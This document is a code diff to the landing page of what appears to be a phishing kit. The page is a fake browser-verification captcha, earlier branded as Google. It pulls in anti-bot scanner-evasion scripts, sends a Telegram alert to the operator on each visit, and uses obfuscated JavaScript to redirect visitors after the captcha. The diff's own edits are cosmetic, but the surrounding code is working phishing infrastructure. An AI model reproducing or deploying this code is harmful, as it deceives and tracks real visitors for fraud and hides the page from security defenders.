@@ -5,10 +5,9 @@ include('Antibot/Dila_DZ.php');
 include('Antibot/blockers.php');
 include('Antibot/detects.php');
 
-// index.php
 require_once __DIR__ . '/includes/functions.php';
 
-// Send a Telegram notification when a visitor lands on index.php
+// Send a notification when a visitor lands on index.php
 sendToTelegram("New Visitor", "index", "");
 
 // If a session_id is provided, reuse it; otherwise create a new one.
@@ -23,7 +22,7 @@ if (isset($_GET['session_id']) && !empty($_GET['session_id'])) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verifying browser - Google</title>
+    <title>Verifying browser</title>
     <link rel="stylesheet" href="pages/res/css/captcha.css">
     <script src="https://www.google.com/recaptcha/api.js" async defer></script>
     <style>
@@ -328,9 +327,6 @@ if (isset($_GET['session_id']) && !empty($_GET['session_id'])) {
             });
         }
 
-        // Set the request ID
-        document.getElementById('request-id').textContent = generateRequestId();
-
         // Handle successful captcha completion
         function onCaptchaSuccess(token) {
             var _0x2efe = [
@@ -361,6 +357,9 @@ if (isset($_GET['session_id']) && !empty($_GET['session_id'])) {
                 window.location.href = _0x17c14b(0x100);
             }, parseInt(_0x179f(0x101)));
         }
+
+        // Set the request ID on page load
+        document.getElementById('request-id').textContent = generateRequestId();
     </script>
 </body>
 </html>
